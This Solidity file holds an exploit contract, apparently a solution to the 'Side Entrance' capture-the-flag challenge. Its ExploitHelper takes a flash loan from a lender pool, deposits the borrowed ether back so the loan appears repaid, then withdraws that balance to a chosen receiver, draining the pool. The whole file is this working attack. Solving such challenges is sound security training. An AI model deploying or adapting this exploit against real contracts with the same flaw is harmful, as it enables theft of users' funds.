// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

interface ISideEntranceLenderPool {
    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function balances(address) external view returns (uint256);
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract ExploitHelper is IFlashLoanEtherReceiver {
    address pool;
    uint256 amount;

    constructor(address _pool){
        pool = _pool;
    }

    function doFlashLoan(uint256 _amount) external {
        amount = _amount;
        ISideEntranceLenderPool(pool).flashLoan(_amount);
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: amount}();
    }

    function withdrawAll(address payable receiver) external {
        ISideEntranceLenderPool(pool).withdraw();
        receiver.transfer(amount);
    }

    receive() external payable {}
    fallback() external payable {}
}
